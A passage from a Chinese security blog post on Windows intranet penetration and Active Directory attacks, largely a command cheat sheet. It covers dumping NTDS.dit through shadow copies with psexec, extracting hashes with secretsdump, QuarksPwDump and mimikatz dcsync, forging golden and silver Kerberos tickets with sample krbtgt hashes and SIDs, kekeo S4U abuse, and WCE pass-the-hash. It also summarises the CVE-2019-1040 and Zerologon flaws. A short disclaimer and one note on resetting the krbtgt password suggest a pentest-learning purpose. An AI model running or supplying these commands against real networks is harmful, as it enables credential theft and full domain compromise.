<li>使用psexec执行：</li>
<li><code>psexec64.exe \\192.168.0.104 -u administrator -p 123456 -h cmd /c &quot;vssadmin create shadow /for=C: &gt; \\192.168.0.104\C$\1.txt&quot;</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/6.png" alt></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/7.png" alt><pre><code>成功地创建了 &#39;C:\&#39; 的卷影副本
卷影副本 ID: {984c45fc-94c2-4de6-adcc-59d266ce5913}
卷影副本卷名: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1</code></pre></li>
<li>ntds.dit和SYSTEM文件的位置：</li>
<li><code>\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit</code></li>
<li><code>\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM</code></li>
<li>把他们复制到指定webshell目录下：</li>
<li><code>psexec64.exe \\192.168.0.104 -u administrator -p 123456 -h cmd /c &quot;copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit \\192.168.0.104\C$\&quot;</code></li>
<li><code>psexec64.exe \\192.168.0.104 -u administrator -p 123456 -h cmd /c &quot;copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM \\192.168.0.104\C$\&quot;</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/8.png" alt></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/9.png" alt></li>
<li>然后通过webshell下载SYSTEM和ntds.dit到本地主机，使用<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py" target="_blank" rel="noopener">secretsdump.py</a>脚本从ntds.dit和SYSTEM文件中提取：domain/uid/rid/LM hash/NT hash</li>
<li><code>python secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/105.png" alt="补图"></li>
</ol>
<ol>
<li>域用户帐户以域数据库的形式保存在活动目录中，ntdsutil.exe是域控制器自带的域数据库管理工具。</li>
<li><strong>域用户hash提取（在域控上执行）：cmd依次执行命令</strong></li>
<li>创建快照：<code>ntdsutil——snapshot——activate instance ntds——create——mount {guid}[——quit——quit]</code></li>
<li>复制快照文件到本地：<code>copy c:\$SNAP_[datetime]_VOLUMEC$\Windows\NTDS\ntds.dit c:\ntds.dit</code></li>
<li>挂载活动目录的快照：<code>ntdsutil——snapshot——mount {guid}——quit——quit</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/101.png" alt></li>
<li>卸载快照并删除快照：unmount {guid}—delete {guid}–quit</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/102.png" alt></li>
<li><strong>导出的ntds.dit文件中哈希值</strong></li>
<li><code>QuarksPwDump.exe --dump-hash-domain --ntds-file c:\ntds.dit</code> #配合ntdsutil导出域用户hash</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/103.png" alt></li>
<li><strong>使用mimikatz lsadump::dcsync导出域内所有用户的hash</strong></li>
<li><code>mimikatz.exe privilege::debug &quot;lsadump::dcsync /domain:god.org /all /csv&quot;</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/104.png" alt></li>
</ol>
<p><strong>使用powerview获取域控信息</strong></p>
<ol>
<li><code>Import-Module .\PowerView.ps1</code></li>
<li><code>Get-DomainComputer -Domain god.org</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/114.png" alt></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/115.png" alt></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/116.png" alt></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/117.png" alt></li>
<li>筛选信息：<code>Get-DomainComputer -Domain god.org | findstr &quot;name distinguishedname objectsid&quot;</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/118.png" alt></li>
</ol>
<hr>
<h2 id="0x50-票据传递攻击"><a href="#0x50-票据传递攻击" class="headerlink" title="0x50 票据传递攻击"></a>0x50 票据传递攻击</h2><ol>
<li>域中每个用户的ticket都是有krbtgt的密码hash来计算生成的。拿到krbtgt的密码hash，就可以伪造ticket，进而使用ticket登录域控制器。</li>
<li><strong>条件：</strong>域管理账号、域名称、SID值</li>
<li><code>net group &quot;domain admins&quot; /domain</code> #查询域管理用户</li>
<li><code>net user /domain</code> #可查看到域名</li>
<li><code>mimikatz.exe log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;</code> #cmd执行一条命令获取所有用户密码</li>
<li><code>mimikatz.exe log &quot;privilege::debug&quot; &quot;lsadump::lsa /patch&quot;</code> #cmd执行一条命令获取所有用户hash及SID值</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/113.png" alt></li>
<li><code>sekurlsa::tickets /export</code> #导出所有票据xxx.kirbi</li>
<li><strong>黄金票据：伪造TGT</strong></li>
<li><code>kerberos::tgt</code></li>
<li><code>mimikatz # kerberos::golden /user:[域用户名] /domain:[域] /sid:[SID值] /krbtgt:[krbtgt hash] /ticket:administrator.kirbi</code> #生成黄金票据（golden ticket）</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/126.png" alt></li>
<li><code>kerberos::ptt administrator.kirbi</code> #导入票据</li>
<li><code>kerberos::tgt</code> #列出当前TGT</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/127.png" alt></li>
<li><code>dir \\owa.god.org\c$</code> #验证票据，列DC目录</li>
<li><code>dir \\root-tvi862ubeh.god.org\c$</code> #列其他域用户目录</li>
<li></li>
<li><strong>域控管理组SID：</strong></li>
<li><ul>
<li><code>域用户SID：S-1-5-21 &lt;DOMAINID&gt; -513</code></li>
</ul>
</li>
<li><ul>
<li><code>域管理员SID：S-1-5-21 &lt;DOMAINID&gt; -512</code></li>
</ul>
</li>
<li><ul>
<li><code>架构管理员SID：S-1-5-21 &lt;DOMAINID&gt; -518</code></li>
</ul>
</li>
<li><ul>
<li><code>企业管理员SID：S-1-5-21 &lt;DOMAINID&gt; -519</code></li>
</ul>
</li>
<li><ul>
<li><code>组策略创建者所有者SID：S-1-5-21 &lt;DOMAINID&gt; -520</code></li>
</ul>
</li>
<li>添加一个SID=519的企业管理员，利用mimikatz执行：</li>
<li><code>mimikatz # kerberos::golden /user:administrator /krbtgt:58e91a5ac358d86513ab224312314061 /domain:god.org /sid:S-1-5-21-2952760202-1353902439-2381784089 /sids:S-1-5-21-2952760202-1353902439-2381784089-512 /ptt</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/124.png" alt></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/125.png" alt></li>
<li><code>C:\&gt;klist</code> #域成员主机上执行klist，查看缓存的票据</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/128.png" alt></li>
<li><strong>白银票据：伪造TGS</strong></li>
<li>rc4获取：<code>kerberos::hash</code>、<code>sekurlsa::logonpasswords</code></li>
<li><code>mimikatz.exe &quot;privilege::debug&quot; &quot;kerberos::golden /domain:[domain] /sid:[SID] /target:域控全称 /service:要访问的服务 /rc4:ntlm /user:[username] /ptt&quot;</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/129.png" alt></li>
<li><strong>使用kekeo进行ptt：</strong><a href="https://github.com/gentilkiwi/kekeo/releases" target="_blank" rel="noopener">https://github.com/gentilkiwi/kekeo/releases</a></li>
<li>生成票据TGT（xxx.kirbi）：<code>kekeo &quot;tgt::ask /user:[username] /domain:[domain] /ntlm:[NTLM]&quot; 或 kekeo &quot;tgt::ask /user:[username] /domain:[domain] /password:[password]</code> </li>
<li>导入票据：<code>kekeo &quot;kerberos::ptt xxx.kirbi&quot;</code> </li>
<li>访问服务：<code>dir \\IP\c$</code></li>
<li>用kekeo请求该用户的TGT：</li>
<li><code>kekeo &quot;tgt::ask /user:[username] /domain:[domain] /password:[password]</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/133.png" alt></li>
<li>使用TGT伪造s4u请求以administrator用户身份请求访问AD（域控）CIFS的ST：</li>
<li><code>kekeo &quot;tgs::s4u /tgt:xxx.kirbi /user:[username]@domain /service:[server]/[DC.domain]&quot;</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/134.png" alt></li>
<li>将ST导入当前会话：</li>
<li><code>kekeo &quot;kerberos::ptt xxx.kirbi&quot;</code></li>
<li><code>dir \\DC\\c$</code></li>
</ol>
<p><strong>WCE(Windows凭据编辑器)传递hash</strong></p>
<ol>
<li>wce.exe -s [username]:[domain]:[LM值]:[NTLM值] #hash传递</li>
<li><code>wce.exe -s administrator:god.org:edea194d76c77d87840ac10a764c7362:4f1a2b2cf1dd79ae22a7f198412d7e51</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/130.png" alt></li>
<li>wce.exe -l #从内存中读取已经登录的信息</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/131.png" alt></li>
<li>wce.exe -w #读取系统管理员明文密码</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/132.png" alt></li>
</ol>
<h2 id="0x51-约束委派"><a href="#0x51-约束委派" class="headerlink" title="0x51 约束委派"></a>0x51 约束委派</h2><ol>
<li></li>
</ol>
<h2 id="内网CVE漏洞"><a href="#内网CVE漏洞" class="headerlink" title="内网CVE漏洞"></a>内网CVE漏洞</h2><p><strong>CVE-2019-1040</strong></p>
<ul>
<li>攻击者可以通过中间人攻击，绕过NTLM MIC（消息完整性检查）保护，将身份验证流量中继到目标服务器。 通过这种攻击使得攻击者在仅有一个普通域账号的情况下可以远程控制 Windows 域内的任何机器，包括域控服务器。<br><a href="https://www.freebuf.com/vuls/207399.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/207399.html</a></li>
</ul>
<p><strong>CVE-2020-1472 域内提权漏洞利用</strong></p>
<ol>
<li>攻击者在通过NetLogon（MS-NRPC）协议与AD域控建立安全通道时，可利用该漏洞将AD域控的计算机账号密码置为空，从而控制域控服务器。</li>
<li></li>
<li><strong>漏洞原理：</strong></li>
<li>Netlogon使用的AES认证算法中的vi向量默认为0，导致攻击者可以绕过认证，可以向域发起Netlogon 计算机账户认证请求, 使用8字节全0 client challenge 不断尝试得到一个正确的8字节全0 client credential 通过认证，再通过相关调用完成对域控密码的修改。具体细节可查看<a href="https://www.cynet.com/zerologon/" target="_blank" rel="noopener">https://www.cynet.com/zerologon/</a></li>
<li></li>
<li><strong>影响版本：</strong><pre><code>Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
Windows Server 2012
Windows Server 2012 (Server Core installation)
Windows Server 2012 R2
Windows Server 2012 R2 (Server Core installation)
Windows Server 2016
Windows Server 2016 (Server Core installation)
Windows Server 2019
Windows Server 2019 (Server Core installation)
Windows Server, version 1903 (Server Core installation)
Windows Server, version 1909 (Server Core installation)
Windows Server, version 2004 (Server Core installation)</code></pre><a href="https://xz.aliyun.com/t/8367" target="_blank" rel="noopener">https://xz.aliyun.com/t/8367</a><br><a href="https://www.jianshu.com/p/525be0335404" target="_blank" rel="noopener">https://www.jianshu.com/p/525be0335404</a><br><a href="https://www.cnblogs.com/forforever/p/13682344.html" target="_blank" rel="noopener">https://www.cnblogs.com/forforever/p/13682344.html</a></li>
</ol>
<p><strong>例子：DC：10.10.10.10、同段主机：10.10.10.11</strong></p>
<ol>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/12.png" alt></li>
<li></li>
</ol>
<h2 id="0xF0-krbtgt密码"><a href="#0xF0-krbtgt密码" class="headerlink" title="0xF0 krbtgt密码"></a>0xF0 krbtgt密码</h2><ol>
<li>当krbtgt用户的hash被拿到后，攻击者可以在域中进行持久性的隐藏，并且日志是无法进行溯源的，只有经常更新krbtgt用户的密码，才能使原有的票据失效。</li>
<li>重置krbtgt密码：<a href="https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/manage/ad-forest-recovery-resetting-the-krbtgt-password" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/manage/ad-forest-recovery-resetting-the-krbtgt-password</a></li>
</ol>
<h2 id="0xF1-其他搜集工具"><a href="#0xF1-其他搜集工具" class="headerlink" title="0xF1 其他搜集工具"></a>0xF1 其他搜集工具</h2><ol>
<li>Seatbelt：利用Seatbelt工具做一些自动化的信息收集</li>
<li><a href="https://github.com/GhostPack/Seatbelt#command-line-usage" target="_blank" rel="noopener">https://github.com/GhostPack/Seatbelt#command-line-usage</a></li>
</ol>
<hr>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ul>
<li><a href="https://www.freebuf.com/articles/web/195709.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/195709.html</a></li>
</ul>

      
       <hr><span style="font-style: italic;color: gray;"> 知识来源于网络，本博客仅供于安全测试学习，禁止非法利用。——《安全法》 </span>
    </div>
</article>



<div class="article_copyright">
    <p><span class="copy-title">文章标题:</span>内网渗透之windows</p>
    
    <p><span class="copy-title">本文作者:</span><a  title="10fteam">10fteam</a></p>
    <p><span class="copy-title">发布时间:</span>2020-02-20, 13:44:17</p>
    <p><span class="copy-title">最后更新:</span>2021-01-26, 22:00:51</p>
    <span class="copy-title">原始链接:</span><a class="post-url" href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/" title="内网渗透之windows">https://10fteam.github.io/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/</a>
    <p>
        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
    </p>
</div>





    




    </div>
    <div class="copyright">
        <p class="footer-entry">©2019-2021 10fteam</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full"><span class="min "></span></button>
<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
<div class="post-toc"><span class="post-toc-title">目录</span>
    <div class="post-toc-content">

    </div>
</div>
<a class="" id="rocket" ></a>

    </div>
</div>
<div class="acParent"></div>

</body>
<script src="/js/jquery.pjax.js?v=1.0.1" ></script>

<script src="/js/script.js?v=1.0.1" ></script>
<script>
    var img_resize = 'default';
    /*作者、标签的自动补全*/
    $(function () {
        $('.search').AutoComplete({
            'data': ['#CTF','#encrypt_decrypt','#工具','#知识','#内网渗透','#CS','#C2','#kali','#漏洞','#HTB','#靶机','#writeup','#bypass','#Linux','#linux','#脚本','#信息搜集','#安全加固','#入侵检测','#应急响应','#CC','#拒绝服务','#DOS','#MSF','#proxy','#数据库','#database','#PHP','#代码审计','#PWN','#powershell','#域渗透','#python','#注入','#phpmyadmin','#SQL','#mssql','#Struts2','#vulhub','#CVE','#中间件','#windows','#backdoor','#xss','#DOM','#cms','#encode_decode','#shell','#后门','#靶场','#vulnhub','#僵尸网络','#webshell','#内存马','#远控','#免杀','#端口','#mimikatz','#提权','#CDN','#DLL','#蓝方','#防守','#WAF','#editor','#MISC','#逆向','#log','#后渗透','#FTP','#日志',],
            'itemHeight': 20,
            'width': 418
        }).AutoComplete('show');
    })
    function initArticle() {
        /*渲染对应的表格样式*/
        
            $(".post .pjax table").addClass("green_title");
        

        /*渲染打赏样式*/
        

        /*高亮代码块行号*/
        
        $('pre code').each(function(){
            var lines = $(this).text().split('\n').length - 1, widther='';
            if (lines>99) {
                widther = 'widther'
            }
            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
            $(this).addClass('has-numbering ' + widther)
                    .parent()
                    .append($numbering);
            for(var i=1;i<=lines;i++){
                $numbering.append($('<li/>').text(i));
            }
        });
        

        /*访问数量*/
        
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
        

        /*代码高亮，行号对齐*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        
        
    }

    /*打赏页面隐藏与展示*/
    

</script>

<!--加入行号的高亮代码块样式-->

<style>
    pre{
        position: relative;
        margin-bottom: 24px;
        border-radius: 10px;
        border: 1px solid #e2dede;
        background: #FFF;
        overflow: hidden;
    }
    code.has-numbering{
        margin-left: 30px;
    }
    code.has-numbering.widther{
        margin-left: 40px;  <!--代码左边宽度-->
    }
    .pre-numbering{
        margin: 0px;
        position: absolute;
        top: 0;
        left: 0;
        width: 20px;
        padding: 0.5em 3px 0.7em 5px;
        border-right: 1px solid #C3CCD0;
        text-align: right;
        color: #AAA;
        background-color: #fafafa;
    }
    .pre-numbering.widther {
        width: 35px;
    }
</style>

<!--自定义样式设置-->
<style>
    
    
    .nav {
        <!--width: 542px;-->
        width: 270px;
    }
    .nav.fullscreen {
        <!--margin-left: -542px;-->
        margin-left: -270px;
    }
    .nav-left {
        width: 120px;
    }
    
    
    @media screen and (max-width: 1468px) {
        .nav {
            width: 492px;
        }
        .nav.fullscreen {
            margin-left: -492px;
        }
        .nav-left {
            width: 100px;
        }
    }
    
    
    @media screen and (max-width: 1024px) {
        .nav {
            width: 492px;
            margin-left: -492px
        }
        .nav.fullscreen {
            margin-left: 0;
        }
        .nav .hide-list.fullscreen {
            left: 492px
        }
    }
    
    @media screen and (max-width: 426px) {
        .nav {
            width: 100%;
        }
        .nav-left {
            width: 100%;
        }
    }
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #e2e0e0;
    }
    
    

    /*列表样式*/
    
    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
        border: #e2dede solid 1px;
        border-radius: 10px;
        padding: 10px 32px 10px 56px;
    }
    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
        padding-top: 5px;
        padding-bottom: 5px;
    }
    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    

    /* 背景图样式 */
    
    


    /*引用块样式*/
    

    /*文章列表背景图*/
    
    .nav-right:before {
        content: ' ';
        display: block;
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        opacity: 0.3;
        background: url("https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture");
        background-repeat: no-repeat;
        background-position: 50% 0;
        -ms-background-size: cover;
        -o-background-size: cover;
        -moz-background-size: cover;
        -webkit-background-size: cover;
        background-size: cover;
    }
    

    
</style>









</html>
